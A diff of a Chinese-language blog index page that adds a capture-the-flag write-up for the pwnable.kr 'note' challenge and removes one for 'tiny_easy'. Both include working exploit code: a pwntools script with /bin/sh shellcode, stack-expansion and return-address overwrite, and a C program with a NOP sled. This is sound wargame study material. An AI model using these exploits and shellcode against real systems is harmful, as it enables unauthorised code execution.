@@ -298,6 +298,137 @@
             
               
                 
+                <a class="post-title-link" href="/2016/08/05/pwnable-rookiss-note/" itemprop="url">
+                  pwnable.kr-rookiss-note
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-08-05T00:00:00+08:00" content="2016-08-05">
+              2016-08-05
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/05/pwnable-rookiss-note/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/05/pwnable-rookiss-note/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="Conclusion">Conclusion</h2><ul>
+<li><code>select_menu()</code>函数是递归调用自身的，并且函数开始都会分配一个0x400字节的空间，每进行一次选择，栈都会至少增长0x400</li>
+<li><code>exit</code>服务会进行ret，即程序会一直ret到main函数，在这过程中，只要我们劫持了栈上保存的任意某个$eip值，程序流就可以控制了</li>
+</ul>
+<p>劫持的方法就显得比较暴力了，我们可以先通过不断调用某个函数，把栈先进行扩充（栈的扩充这个行为叫做<strong>automatic stack expansion</strong>)</p>
+<p>栈的最大扩充的大小可以通过<code>ulimit -s</code>，一般是0x800000bytes，但是如果扩充的太多的话，再执行后面的操作到时候就可能爆栈了，所以我们扩充个一半大小，类似二次函数的极点</p>
+<p>接着，我们只要不断的<code>create_note</code>&amp;&amp;<code>delete_note</code>，直到分配到了一个我们想要的位置（服务器没有开aslr），然后往里面写入shellcode所在的地址即可（<code>write_note</code>没有做长度检查，所以想写多少写多少，写个0x500字节就肯定能覆盖到某个$eip了） </p>
+<p>这样还是有一定概率失败的，因为在不断的分配删除内存的过程，栈仍然会扩充，但是我的exp里的那个作为界限的地址是写死的，所以有可能<code>mmap</code>出来的内存其实已经在栈上了但是却又被<code>munmap</code>了，这样的结果就是栈的中间出现了断层，在ret的时候就可能会ret到这段内存，导致segment fault，不过这种碰运气的事，只要一直试就好了，所以一个死循环就搞定了。(这个exp放在服务器上跑大概要好几分钟，毕竟我的方法太暴力了。如果有好的方法一定要告诉我哦)</p>
+<p>另外，忘记了这题是本地利用，用了zio写的，后来才利用，不过看了下服务器上有pwntools，就又写了个pwntools的版本，不过还是贴了zio的exp版本上来(pwntools之前没怎么用过，mark一下)</p>
+<h2 id="Exploit">Exploit</h2><h3 id="pwntools">pwntools</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_note</span><span class="params">(conn)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(<span class="string">'1'</span>)</span><br><span class="line">    conn.recvuntil(<span class="string">'note created. no '</span>)</span><br><span class="line">    no = conn.recvline()[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">    conn.recvuntil(<span class="string">'['</span>)</span><br><span class="line">    <span class="keyword">return</span> (int(no), int(conn.recvuntil(<span class="string">']'</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_note</span><span class="params">(conn, no, payload)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(<span class="string">'2'</span>)</span><br><span class="line">    conn.recvuntil(<span class="string">'note no?'</span>)</span><br><span class="line">    conn.sendline(str(no))</span><br><span class="line">    conn.recvuntil(<span class="string">'4096 byte)'</span>)</span><br><span class="line">    conn.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_note</span><span class="params">(conn, no)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(<span class="string">'3'</span>)</span><br><span class="line">    conn.recvuntil(<span class="string">'note no?'</span>)</span><br><span class="line">    conn.sendline(str(no))</span><br><span class="line">    conn.recvline()</span><br><span class="line">    <span class="keyword">return</span> conn.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(conn, no)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(<span class="string">'4'</span>)</span><br><span class="line">    conn.recvuntil(<span class="string">'note no?'</span>)</span><br><span class="line">    conn.sendline(str(no))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_ret</span><span class="params">(conn)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">(conn, payload)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(str(<span class="number">0x31337</span>))</span><br><span class="line">    conn.recvuntil(<span class="string">'this'</span>)</span><br><span class="line">    conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    conn    = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9019</span>)</span><br><span class="line">    mem     = create_note(conn)</span><br><span class="line">    <span class="keyword">while</span> mem[<span class="number">1</span>] &gt; <span class="number">0xf0000000</span>:</span><br><span class="line">        delete_note(conn, mem[<span class="number">0</span>])</span><br><span class="line">        mem = create_note(conn)</span><br><span class="line">    write_note(conn, mem[<span class="number">0</span>], shellcode.rjust(<span class="number">0x100</span>, <span class="string">'\x90'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stack expansion</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">0</span>, <span class="number">0x1000</span>):</span><br><span class="line">        secret(conn, <span class="string">'A'</span> * <span class="number">0x400</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-] stack expansion  :"</span> + str(i)</span><br><span class="line"></span><br><span class="line">    mem1 = create_note(conn)</span><br><span class="line">    <span class="keyword">while</span> (mem1[<span class="number">1</span>] &lt; <span class="number">0xffd60000</span>) <span class="keyword">or</span> (mem[<span class="number">1</span>] &gt; <span class="number">0xffffd000</span>):</span><br><span class="line">        delete_note(conn, mem1[<span class="number">0</span>])</span><br><span class="line">        mem1    = create_note(conn)</span><br><span class="line">        note    = read_note(conn, mem1[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-] memory address   : "</span> + hex(mem1[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-] note             : "</span> + note.encode(<span class="string">'hex'</span>) + <span class="string">'\n'</span></span><br><span class="line">        <span class="keyword">if</span> (mem1[<span class="number">1</span>] &gt;= <span class="number">0xf7ffc000</span>) <span class="keyword">and</span> (mem1[<span class="number">1</span>] &lt; <span class="number">0xffd60000</span>):</span><br><span class="line">            <span class="keyword">if</span> note != <span class="string">'\x0a'</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    payload = p32(mem[<span class="number">1</span>]) * (<span class="number">0x1000</span>/<span class="number">4</span>-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\n-------------find it-------------------'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] write to     :   '</span> + hex(mem1[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] with payload :   '</span> + payload.encode(<span class="string">'hex'</span>)</span><br><span class="line">    write_note(conn, mem1[<span class="number">0</span>], payload)</span><br><span class="line"></span><br><span class="line">    exit_ret(conn)</span><br><span class="line">    conn.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/08/05/pwnable-rookiss-note/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/08/02/pwnable-rookiss-rsa-calculator/" itemprop="url">
                   pwnable.kr-rookiss-rsa-calculator
                 </a>
@@ -777,135 +908,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/27/pwnable-rookiss-tiny-easy/" itemprop="url">
-                  pwnable.kr-rookiss-tiny-easy
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-27T00:00:00+08:00" content="2016-07-27">
-              2016-07-27
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/27/pwnable-rookiss-tiny-easy/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/27/pwnable-rookiss-tiny-easy/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Trick">Trick</h2><p>暴力暴力暴力。</p>
-<p>payload里放了一个长度0xff00的<code>sled</code> 。</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">tiny_easy<span class="variable">@ubuntu</span><span class="symbol">:/tmp/pwn</span><span class="variable">$ </span><span class="keyword">while</span> <span class="keyword">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">./pwn</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-<h2 id="Conclusion">Conclusion</h2><p>刚开始没有想到，也是参考了别人的做法。没想到的原因还是太粗心了，在gdb-peda里用<code>checksec</code>看了下，发现开启了<code>NX</code>，以为stack肯定是unexcutable。但是看了别人的writeup后才发现原来stack是可执行的。（起始我之前也<code>vmmap</code>过。可能是眼花了没看到。）</p>
-<p>我的利用方法是写了个c程序，用<code>execve</code>函数直接控制<code>argv[0]</code>，然后把代码扔到服务器<code>/tmp</code>下编译，另外也可以像引文里，改变环境变量和利用软链接来控制程序执行时的<code>argv[0]</code></p>
-<p>这种做法步骤大致如下</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">mkdir /tmp/pwn</span><br><span class="line">ln <span class="operator">-s</span> /tmp/pwn/tiny_easy /home/tiny_easy/tiny_easy`</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp/pwn:<span class="variable">$PATH</span></span><br><span class="line">whilt <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">tiny_easy [payload]</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<h2 id="Exploit">Exploit</h2><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="special">#</span>include &lt;stdio.h&gt;</span><br><span class="line"><span class="special">#</span>include &lt;string.h&gt;</span><br><span class="line">char shellcode<span class="special">[</span><span class="special">]</span> =</span><br><span class="line">        "<span class="command">\xeb</span><span class="command">\x</span>1a<span class="command">\x</span>5e<span class="command">\x</span>31<span class="command">\xc</span>0<span class="command">\x</span>88<span class="command">\x</span>46<span class="command">\x</span>07<span class="command">\x</span>8d<span class="command">\x</span>1e<span class="command">\x</span>89<span class="command">\x</span>5e<span class="command">\x</span>08<span class="command">\x</span>89<span class="command">\x</span>46"</span><br><span class="line">        "<span class="command">\x</span>0c<span class="command">\xb</span>0<span class="command">\x</span>0b<span class="command">\x</span>89<span class="command">\xf</span>3<span class="command">\x</span>8d<span class="command">\x</span>4e<span class="command">\x</span>08<span class="command">\x</span>8d<span class="command">\x</span>56<span class="command">\x</span>0c<span class="command">\xcd</span><span class="command">\x</span>80<span class="command">\xe</span>8<span class="command">\xe</span>1"</span><br><span class="line">        "<span class="command">\xff</span><span class="command">\xff</span><span class="command">\xff</span><span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>69<span class="command">\x</span>6e<span class="command">\x</span>2f<span class="command">\x</span>73<span class="command">\x</span>68";</span><br><span class="line">char payload<span class="special">[</span>0x10000<span class="special">]</span>;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char *argv<span class="special">[</span><span class="special">]</span>)</span><br><span class="line"><span class="special">&#123;</span></span><br><span class="line">    int i = 0;</span><br><span class="line">    for (i = 0; i &lt; 0xff00; i++)<span class="special">&#123;</span></span><br><span class="line">        payload<span class="special">[</span>i<span class="special">]</span> = '<span class="command">\x</span>90';</span><br><span class="line">    <span class="special">&#125;</span></span><br><span class="line">    strcpy(payload + 0xff00, shellcode);</span><br><span class="line"></span><br><span class="line">    char *my_argv<span class="special">[</span><span class="special">]</span> = <span class="special">&#123;</span>"<span class="command">\x</span>38<span class="command">\x</span>5c<span class="command">\xe</span>3<span class="command">\xff</span>", NULL<span class="special">&#125;</span>;</span><br><span class="line">    char *my_env<span class="special">[</span><span class="special">]</span>  = <span class="special">&#123;</span>payload, NULL<span class="special">&#125;</span>;</span><br><span class="line">    execve("./tiny_easy", my_argv, my_env);</span><br><span class="line">    return 0;</span><br><span class="line"><span class="special">&#125;</span></span><br></pre></td></tr></table></figure>
-<h2 id="Reference">Reference</h2><p><a href="https://gist.github.com/ihciah/b921fe522244e5b70e7a" target="_blank" rel="external">https://gist.github.com/ihciah/b921fe522244e5b70e7a</a></p>
-<p><a href="http://www.secbox.cn/hacker/ctf/5547.html" target="_blank" rel="external">http://www.secbox.cn/hacker/ctf/5547.html</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -951,7 +953,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">23</span>
+              <span class="site-state-item-count">24</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -968,7 +970,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-count">23</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
